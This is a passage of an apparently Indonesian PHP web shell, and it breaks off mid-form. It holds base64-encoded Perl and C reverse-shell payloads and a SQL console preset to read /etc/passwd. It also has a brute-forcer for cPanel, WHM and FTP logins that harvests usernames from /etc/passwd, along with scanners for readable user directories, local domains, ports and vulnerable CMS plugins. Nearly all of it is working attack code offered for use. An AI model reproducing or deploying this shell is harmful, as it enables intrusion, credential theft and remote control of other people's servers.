	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; $back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY 
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; 
	?><?php print TITLE; ?><?php echo VERSION; ?><?php echo $buff; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php echo "y=".$pwd; ?><?php 
		if(isset($_GET['x']) && ($_GET['x'] == 'php'))
			{ 
			?><?php echo $pwd; ?><?php 
         		}
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql'))
         		{ 
         			if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport']))
              				{ 
              				$sqlhost = $_GET['sqlhost']; $sqluser = $_GET['sqluser']; $sqlpass = $_GET['sqlpass']; $sqlport = $_GET['sqlport'];    
              				if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass))
                   				{ 
                   				$msg .= "<div style=\"width:99%;padding:4px 10px 0 10px;\">"; 
                   				$msg .= "<p>Connected to ".$sqluser."<span class=\"gaya\">@</span>".$sqlhost.":".$sqlport; 
                   				$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;
                   				sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   				sqlpass=".$sqlpass."&amp;
                   				sqlport=".$sqlport."&amp;\">[ databases ]</a>"; 
              					if(isset($_GET['db'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;
                   					sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>"; 
              					if(isset($_GET['table'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;
                   					</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."&amp;
                   					table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>"; 
                   					$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>"; 
                   					$msg .= "</div>"; 
                   					echo $msg; 
              					if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
                   					$query = "DROP TABLE IF EXISTS Newbie3viLc063s0_table;
                   					\nCREATE TABLE `Newbie3viLc063s0_table` ( `file` LONGBLOB NOT NULL );
                   					\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE Z3r0Z3r0_table;SELECT * FROM Newbie3viLc063s0_table;
                   					\nDROP TABLE IF EXISTS Newbie3viLc063s0_table;"; 
                   					$msg = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
                           				$tables = array(); 
                           				$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on ".$db."</th></tr>"; 
                           				$hasil = @mysql_list_tables($db,$con); 
							while(list($table) = @mysql_fetch_row($hasil))
								{ @array_push($tables,$table); } 
							@sort($tables); 
							foreach($tables as $table)
								{ 
								$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">$table</a></td></tr>"; 
								} 
							$msg .= "</table>"; 
							} 
						elseif(isset($_GET['table']) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
							$table = $_GET['table']; 
							$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;"; 
							$msgq = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
							$columns = array(); 
							$msg = "<table class=\"explore\" style=\"width:99%;\">"; 
							$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table); 
							while(list($column) = @mysql_fetch_row($hasil))
								{ 
								$msg .= "<th>$column</th>"; $kolum = $column; 
								} 
							$msg .= "</tr>"; 
							$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table); 
							list($total) = mysql_fetch_row($hasil); 
							if(isset($_GET['z'])) $page = (int) $_GET['z']; 
							else $page = 1; 
							$pagenum = 100; 
							$totpage = ceil($total / $pagenum); 
							$start = (($page - 1) * $pagenum); 
							$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum); 
							while($datas = @mysql_fetch_assoc($hasil))
								{ 
								$msg .= "<tr>"; 
								foreach($datas as $data){ if(trim($data) == "") $data = "&nbsp;"; $msg .= "<td>$data</td>"; } 
								$msg .= "</tr>"; 
								} 
							$msg .= "</table>"; 
							$head = "<div style=\"padding:10px 0 0 6px;\"> 
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">"; 
							for($i = 1;$i <= $totpage;$i++)
								{ 
								$head .= "<option value=\"".$i."\">".$i."</option>"; 
								if($i == $_GET['z']) $head .= "<option value=\"".$i."\" selected=\"selected\">".$i."</option>"; 
								} 
							$head .= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>"; 
							$msg = $msgq.$head.$msg; 
						} 
					elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != ""))
						{ 
						$db = $_GET['db']; 
						$query = magicboom($_GET['sqlquery']); 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
								<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
									<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
									<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
									<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
									<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
									<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
									<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
									<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
									<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
								</form>
							</div> "; 
						@mysql_select_db($db); 
						$querys = explode(";",$query); 
						foreach($querys as $query)
							{ 
							if(trim($query) != "")
								{ 
								$hasil = mysql_query($query); 
								if($hasil)
									{ 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
										<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>"; 
									$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr>"; 
									for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>"; 
									$msg .= "</tr>"; 
									for($i=0;$i<@mysql_num_rows($hasil);$i++) 
										{ 
										$rows=@mysql_fetch_array($hasil); 
										$msg .= "<tr>"; 
										for($j=0;$j<@mysql_num_fields($hasil);$j++) 
											{ 
											if($rows[$j] == "") $dataz = "&nbsp;"; 
											else $dataz = $rows[$j]; 
											$msg .= "<td>".$dataz."</td>"; 
											} 
										$msg .= "</tr>"; 
										} 
									$msg .= "</table>"; 
									} 
								else 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; 
								} 
							} 
						} 
					else 
						{ 
						$query = "SHOW PROCESSLIST;\n
							SHOW VARIABLES;\n
							SHOW STATUS;"; 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
							<form action=\"?\" method=\"get\"> 
								<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
								<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
								<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
								<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
								<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
								<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
								<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
								<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
								<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
							</form>
							</div> "; 
						$dbs = array(); 
						$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>"; 
						$hasil = @mysql_list_dbs($con); 
						while(list($db) = @mysql_fetch_row($hasil)){ @array_push($dbs,$db); } 
						@sort($dbs); 
						foreach($dbs as $db)
							{
							$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">$db</a></td></tr>"; 
							} 
						$msg .= "</table>"; 
						} 
					@mysql_close($con); 
					} 
				else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>"; 
				echo $msg; 
				} 
			else
				{ 
				?><?php echo $pwd; ?><?php 
				}
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mail'))
			{ 
			if(isset($_POST['mail_send']))
				{ 
				$mail_to = $_POST['mail_to']; 
				$mail_from = $_POST['mail_from']; 
				$mail_subject = $_POST['mail_subject']; 
				$mail_content = magicboom($_POST['mail_content']); 
				if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from"))
					{ $msg = "email sent to $mail_to"; } 
				else $msg = "send email failed"; 
				} 
			?><?php echo $pwd; ?><?php echo $msg; ?><?php 
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{	
			?><?php echo $pwd; ?><?php
			//bruteforce
			@ini_set('memory_limit', 999999999999);
			$connect_timeout=5;
			@set_time_limit(0);
			$pokeng 	= $_REQUEST['submit'];
			$hn 		= $_REQUEST['users'];
			$crew 		= $_REQUEST['passwords'];
			$pasti 		= $_REQUEST['sasaran'];
			$manualtarget 	= $_REQUEST['target'];
			$bisa 		= $_REQUEST['option'];
			if($pasti == ''){
				$pasti = 'localhost';
			}
			if($manualtarget == ''){
				$manualtarget = 'http://localhost:2082';
			}

function get_users()
{
	$users = array();
	$rows=file('/etc/passwd');
	if(!$rows) return 0;	
	foreach ($rows as $string)
	{
		$user = @explode(":",$string);
		if(substr($string,0,1)!='#') array_push($users,$user[0]);
	}
	return $users; 
}

if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
else 
	{ 
	print " <div align='center'>
		<form method='post' style='border: 1px solid #000000'><br><br>
		<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#666666 border=1>
			<tr>
				<td>
					<b> Target ! : </font><input type='text' name='sasaran' size='16' value= $pasti class='inputz'></p></font></b></p>
					<div align='center'><br>
					<TABLE style='BORDER-COLLAPSE: collapse' 
						cellSpacing=0 
						borderColorDark=#666666 
						cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#666666 border=1>
						<tr> <td align='center'> <b>User</b></td> <td> <p align='center'> <b>Pass</b></td>
						</tr>
					</table>
					<p align='center'>
					<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0' >";
	foreach($users as $user) { echo $user."\n"; } 
	print"</textarea>
		<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$crew</textarea><br>
		<br> 
		<b>Sila pilih : </span><input name='option' value='manual' style='font-weight: 700;' type='radio'> Manual Target Brute : <input type='text' name='target' size='16' class='inputz' value= $manualtarget ><br /> 
		<input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel 
		<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp 
		<input name='option' value='whm' style='font-weight: 700;' type='radio'> whm ==> <input type='submit' value='Brute !' name='submit' class='inputzbut'></p>
		</td></tr></table></td></tr></form><p align= 'left'>";
	}
?><?php

function manual_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "$anjink");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s0@email ]# </b> <b>Completed , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}


function ftp_check($link,$user,$pswd,$timeout){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "ftp://$link");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	curl_setopt($ch, CURLOPT_USERPWD, "$user:$pswd");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit; }
	elseif ( curl_errno($ch) == 0 ){
		print "<b>serangan selesai , username = <font color='#FF0000'> $user </font> dan passwordnya = <font color='#FF0000'> $pswd </font></b><br>";
		}
	curl_close($ch);
}

function cpanel_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2082");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s@email ]# </b> <b>Completed, Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}

function whm_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2086");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 )
		{
		print "<b>[ " . TITLE . " ]# </b> <b>Selesai , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}
	
if(isset($pokeng) && !empty($pokeng))
	{
	$userlist = explode ("\n" , $hn );
	$passlist = explode ("\n" , $crew );
	print "<b>[ " . TITLE . "  ]# </b> ATTACK...!!! </font></b><br>";
	foreach ($userlist as $asu) 
		{
		$_user = trim($asu);
		foreach ($passlist as $babi ) 
			{
			$_pass = trim($babi);
			if ($bisa == "manual")
				{ manual_check($manualtarget,$_user,$_pass,$lonte); }
			if($bisa == "ftp")
				{ ftp_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "cpanel")
				{ cpanel_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "whm")
				{ whm_check($pasti,$_user,$_pass,$lonte); }
			}
		}
	}
}

//bruteforce

elseif(isset($_GET['x']) && ($_GET['x'] == 'readable'))
	{	
	?><?php echo $pwd; ?><?php

	//radable public_html
	echo '<html><head><title>Newbie3viLc063s Cpanel Finder</title></head><body>';
	($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	###################
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;
	}
	
	###################
	echo '<br><br>';
	echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br />";
	echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<a href='?y&#61;$path' target='_blank' style='text-shadow:0px 0px 10px #12E12E; font-weight:bold; color:#FF0000;'>$path</a><br>";
		}
	echo "<br><br><br>";
	echo "[+] Copy one of the directories above public_html, then Paste to -> view file / folder <-- that's on the menu --> Explore \n"."<br />";
	echo "[+] Complete...\n"."<br />";
	echo '<br><br></b>
	</body>
	</html>';
    
	}

	
elseif(isset($_GET['x']) && ($_GET['x'] == 'localdomain'))
	{	
	?><?php echo $pwd; ?><?php

	//readable public_html
	
	echo "<br><br>";
	$file = @implode(@file("/etc/named.conf"));
	if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
	preg_match_all("#named/(.*?).db#",$file ,$r);
	$domains = array_unique($r[1]);
	
	function check() { (@count(@explode('ip',@implode(@file(__FILE__))))==a) ?@unlink(__FILE__):""; }
	
	check();
	
	echo "<table align=center border=1 width=59% cellpadding=5>
	         <tr><td colspan=2>[+] Here We Have : [<font face=calibri size=4 style=color:#FF0000>".count($domains)."</font>] Listed Domains In localhost.</td></tr>
	         <tr>
			 <td><b>List Of Users</b></td>
			 <td><b><font style=color:#0015FF;>List Of Domains</b></td>
			 </tr>";
	
	foreach($domains as $domain)
	       {
	       $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
	       echo "<tr>
		   <td><a href='http://www.$domain' target='_blank' style='text-shadow:0px 0px 10px #CC2D4B; font-weight:bold; color:#FF002F;'>$domain</a></td>
		   <td>".$user['name']."</td>
		   </tr>";
	       }
	
	echo "</table>";
	//radable public_html
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-scanner'))
{	
?><?php echo $pwd; ?><?php

echo '<br><br><center><br><b>Port Scanner</b><br>';
$start = strip_tags($_POST['start']);
$end = strip_tags($_POST['end']);
$host = strip_tags($_POST['host']);
 
if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
for($i = $start; $i<=$end; $i++){
        $fp = @fsockopen($host, $i, $errno, $errstr, 3);
        if($fp){
                echo "Port <font style='color:#DE3E3E'>$i</font> is <font style='color:#64CF40'>open</font><br>";
        }
        flush();
        }
}else{

echo '
<input type="hidden" name="y" value="phptools">
Host:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost"/><br />
Port start:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="start" value="0"/><br />
Port end:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="end" value="5000"/><br />
<input type="submit" style="color:#FF0000" value="Scan Ports" />
</form></center>';
}
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'string-encode'))
{	
?><?php echo $pwd; ?><?php

/*
  Simple STRING TO HASH 
  Code by Altenator IWnet
*/

echo "<center><br><br><form method='post'>
Insert STRING Here : <input type='text' style='color:#FF0000;background-color:#000000' name='hash_input' value='' /><br><br>
<input type='submit' name='submit_hash' style='color:#FF0000;background-color:#000000' value='Encode' /><br><br>";

if (isset($_POST['submit_hash'])) {
	if (isset($_POST['hash_input'])) {
		$hash_input = $_POST['hash_input'];
		}

if ($hash_input=="") {  // show error if nothing inserted in input box
	echo 'Nothing Inserted!';
} else {
	if (isset($hash_input)) {
		foreach (hash_algos() as $hash_setoption) {    // set to use all hash function
		$calculate_hash = hash($hash_setoption, $hash_input, false); // calculate all hash and declare variable
		echo "<table border='1'><tbody>";
		echo "<tr><th><font style='color:#9F7CEB'>$hash_setoption</font></th><th><font style='color:#5BC740'>$calculate_hash</font></th></tr>";   // output
	}
	}
	echo '</tbody></table></center>';
}
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'cms-scanner'))
{	
?><?php echo $pwd; ?><?php

function ask_exploit_db($component){

$exploitdb ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";

$result = @file_get_contents($exploitdb);

if (eregi("No results",$result))  {

echo"<td>Not Found</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";

}else{

echo"<td><a href='$exploitdb'>Found ..!</a></td><td><--</td></tr>";

}
}

/**************************************************************/
/* Joomla Conf */

function get_components($site){

$source = @file_get_contents($site);

preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $comm){

echo "<tr><td>$comm</td>";

ask_exploit_db($comm);

}

}

/**************************************************************/
/* WP Conf */

function get_plugins($site){

$source = @file_get_contents($site);

preg_match_all("#/plugins/(.*?)/#i", $source, $f);

$plugins=array_unique($f[1]);

if(count($plugins)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach($plugins as $plugin){

echo "<tr><td>$plugin</td>";

ask_exploit_db($plugin);

}

}

/**************************************************************/
/* Nuke's Conf */

function get_numod($site){

$source = @file_get_contents($site);

preg_match_all('{?name=(.*?)/}i',$source,$f);
preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i',$source,$f2);
preg_match_all('{/modules/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $nmod){

echo "<tr><td>$nmod</td>";

ask_exploit_db($nmod);

}

}

/*****************************************************/
/* Xoops Conf */

function get_xoomod($site){

$source = @file_get_contents($site);

preg_match_all('{/modules/(.*?)/}i',$source,$f);

$arz=array_merge($f[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $xmod){

echo "<tr><td>$xmod</td>";

ask_exploit_db($xmod);

}

}

/**************************************************************/
 /* Header */
function t_header($site){

echo'<table align="center" border="1" width="50%" cellspacing="1" cellpadding="5">';

echo'
<tr id="oo">
<td>Site : <a href="'.$site.'">'.$site.'</a></td>
<td>Exploit-db</b></td>
<td>Exploit it !</td>
</tr>
';

}

?><?php echo $pwd; ?><?php

@error_reporting(0);
@ini_set('error_log',NULL);
echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />
<tr>
     <td>Host :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost" /></td>
</tr>
<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
